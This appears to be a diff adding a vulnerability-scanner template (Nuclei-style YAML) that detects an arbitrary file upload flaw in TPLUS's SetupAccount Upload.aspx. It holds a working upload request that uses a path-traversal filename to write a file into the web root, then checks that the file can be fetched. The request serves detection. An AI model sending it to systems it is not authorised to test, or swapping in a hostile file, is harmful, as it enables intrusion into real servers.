@@ -1,0 +1,45 @@
+id: changjie-tplus-upload-writefile
+info:
+  name: Vulnerable File Upload in TPLUS SetupAccount
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a critical file upload vulnerability in the TPLUS SetupAccount Upload functionality. It allows an attacker to upload arbitrary files to specific directories.
+  reference:
+    - https://weibo.com/ttarticle/x/m/show/id/2309404807909669208397?_wb_client_=1
+variables:
+  randstr: "{{rand_text_alphanumeric(60)}}"
+  rboundary: "{{rand_text_alphanumeric(8)}}"
+  randname: "{{rand_text_alphanumeric(6)}}"
+flow: |
+  http(1) && http(2)
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/tplus/SM/SetupAccount/Upload.aspx?preload=1"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}"
+    body: |
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="File1"; filename="../../../img/login/{{randname}}.jpg"
+      Content-Type: image/jpeg
+
+      {{randstr}}
+      ------WebKitFormBoundary{{rboundary}}--
+    matchers:
+      - type: status
+        status:
+          - 200
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/tplus/img/login/{{randname}}.jpg"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{randstr}}"
